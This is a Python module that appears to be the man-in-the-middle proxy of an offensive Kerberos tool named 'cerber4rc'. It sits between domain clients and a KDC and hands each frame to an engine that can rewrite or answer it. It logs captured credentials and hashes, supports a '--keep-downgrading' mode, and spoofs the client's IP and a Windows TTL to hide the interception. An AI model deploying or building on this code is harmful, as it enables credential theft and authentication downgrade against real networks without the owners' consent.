from __future__ import annotations

import select
import socket
import threading
from collections.abc import Iterator

from .config import Config
from .engine import Engine
from .output import Output
from .state import Session

IP_TRANSPARENT = 19

WINDOWS_TTL = 128


class TransparentUnavailable(RuntimeError):
    pass


def take_frames(buf: bytearray) -> Iterator[bytes]:
    while len(buf) >= 4:
        n = int.from_bytes(buf[:4], "big")
        if n & 0x80000000 or len(buf) < 4 + n:
            break
        yield bytes(buf[: 4 + n])
        del buf[: 4 + n]


class Proxy:
    def __init__(self, config: Config, engine: Engine, output: Output) -> None:
        self.config = config
        self.engine = engine
        self.output = output
        self._listener: socket.socket | None = None
        self._running = False
        self.served = False

    def serve_forever(self) -> None:
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if self.config.transparent:
            try:
                self._listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)
            except OSError as exc:
                self._listener.close()
                self._listener = None
                raise TransparentUnavailable(
                    f"--transparent cannot enable IP_TRANSPARENT on the listening "
                    f"socket: {exc}.\n"
                    "It needs CAP_NET_ADMIN. Either run under sudo, or grant the "
                    "capability to the interpreter running cerber4rc:\n"
                    "    sudo setcap cap_net_admin,cap_net_raw+eip "
                    '"$(readlink -f "$(command -v python3)")"\n'
                    "Or drop --transparent to use the DNAT path, which needs no "
                    "privileges beyond the nft rule."
                ) from exc
        self._listener.bind((self.config.listen_host, self.config.listen_port))
        self._listener.listen(128)
        self._running = True
        self.served = True
        flags = [
            name
            for name, on in (
                ("--keep-downgrading", self.config.keep_downgrading),
                ("--machines", self.config.machines),
            )
            if on
        ]
        flags_suffix = f", flags: {', '.join(flags)}" if flags else ""
        self.output.event(
            f"listening on {self.config.listen_host}:{self.config.listen_port}, "
            f"forwarding to {self.config.kdc_host}:{self.config.kdc_port} ({self.config.mode.value})"
            f"{flags_suffix}, hashes: {self.config.hash_prefix}_*"
        )
        try:
            while self._running:
                try:
                    client_sock, addr = self._listener.accept()
                except OSError:
                    break
                threading.Thread(
                    target=self._handle_connection,
                    args=(client_sock, addr),
                    daemon=True,
                ).start()
        finally:
            self.stop()

    def stop(self) -> None:
        self._running = False
        if self._listener is not None:
            try:
                self._listener.close()
            except OSError:
                pass

    def _kdc_address(self, client_sock: socket.socket) -> tuple[str, int]:
        if not self.config.transparent:
            return (self.config.kdc_host, self.config.kdc_port)
        host, port = client_sock.getsockname()[:2]
        return (host, port)

    def _make_transparent(self, sock: socket.socket, client: tuple[str, int]) -> None:
        sock.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_IP, socket.IP_TTL, WINDOWS_TTL)
        try:
            sock.bind(client)
        except OSError:
            sock.bind((client[0], 0))

    def _handle_connection(
        self, client_sock: socket.socket, addr: tuple[str, int]
    ) -> None:
        client_ip, client_port = addr
        session = Session(client_ip=client_ip)
        self.output.debug(
            f"[{client_ip}] connection accepted from {client_ip}:{client_port}"
        )
        try:
            kdc_addr = self._kdc_address(client_sock)
            kdc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            kdc_sock.settimeout(self.config.socket_timeout)
            if self.config.transparent:
                self._make_transparent(kdc_sock, addr)
            kdc_sock.connect(kdc_addr)
        except OSError as exc:
            self.output.event(f"[{client_ip}] cannot reach KDC: {exc}")
            client_sock.close()
            return
        self.output.debug(
            f"[{client_ip}] connected to KDC {kdc_addr[0]}:{kdc_addr[1]}"
            + (
                f" as {kdc_sock.getsockname()[0]}:{kdc_sock.getsockname()[1]}"
                if self.config.transparent
                else ""
            )
        )

        client_buf = bytearray()
        kdc_buf = bytearray()
        stats = {"c_frames": 0, "c_bytes": 0, "k_frames": 0, "k_bytes": 0}
        try:
            while True:
                try:
                    readable, _, _ = select.select(
                        [client_sock, kdc_sock], [], [], self.config.socket_timeout
                    )
                except OSError as exc:
                    self.output.debug(f"[{client_ip}] select failed: {exc}")
                    break
                if not readable:
                    self.output.debug(f"[{client_ip}] idle timeout, closing")
                    break
                if client_sock in readable and not self._pump(
                    client_sock, kdc_sock, client_buf, session, True, stats
                ):
                    break
                if kdc_sock in readable and not self._pump(
                    kdc_sock, client_sock, kdc_buf, session, False, stats
                ):
                    break
        finally:
            self.output.debug(
                f"[{client_ip}] connection closed after "
                f"{stats['c_frames']} frames / {stats['c_bytes']} bytes (client->KDC), "
                f"{stats['k_frames']} frames / {stats['k_bytes']} bytes (KDC->client)"
            )
            for sock in (client_sock, kdc_sock):
                try:
                    sock.close()
                except OSError:
                    pass

    def _pump(
        self,
        src: socket.socket,
        dst: socket.socket,
        buf: bytearray,
        session: Session,
        from_client: bool,
        stats: dict[str, int],
    ) -> bool:
        try:
            data = src.recv(self.config.buffer_size)
        except (TimeoutError, ConnectionResetError, OSError) as exc:
            self.output.debug(f"[{session.client_ip}] recv failed: {exc}")
            return False
        if not data:
            return False
        buf.extend(data)

        direction = "client->KDC" if from_client else "KDC->client"
        frames_key, bytes_key = (
            ("c_frames", "c_bytes") if from_client else ("k_frames", "k_bytes")
        )
        frame_count = 0
        for one_frame in take_frames(buf):
            frame_count += 1
            stats[frames_key] += 1
            stats[bytes_key] += len(one_frame)

            handler = (
                self.engine.handle_client_frame
                if from_client
                else self.engine.handle_kdc_frame
            )
            result = handler(session, one_frame)

            for line in result.log_lines:
                self.output.event(line)
            for line in result.debug_lines:
                self.output.debug(line)
            for cred in result.credentials:
                self.output.credential(cred)
            for principal, valid in result.verdicts:
                self.output.resolve(principal, valid)

            try:
                if result.reply_to_client is not None:
                    src.sendall(result.reply_to_client)
                elif result.forward is not None:
                    dst.sendall(result.forward)
            except OSError as exc:
                self.output.debug(f"[{session.client_ip}] send failed: {exc}")
                return False

            if result.close:
                return False

        if frame_count > 1:
            self.output.debug(
                f"[{session.client_ip}] {direction}: {frame_count} frames extracted from one read"
            )
        if buf:
            if len(buf) >= 4 and not (int.from_bytes(buf[:4], "big") & 0x80000000):
                need = int.from_bytes(buf[:4], "big") + 4
                self.output.debug(
                    f"[{session.client_ip}] {direction}: partial frame buffered (have {len(buf)} of {need} bytes)"
                )
            else:
                self.output.debug(
                    f"[{session.client_ip}] {direction}: partial frame buffered (have {len(buf)} bytes, "
                    "length prefix incomplete)"
                )
        return True
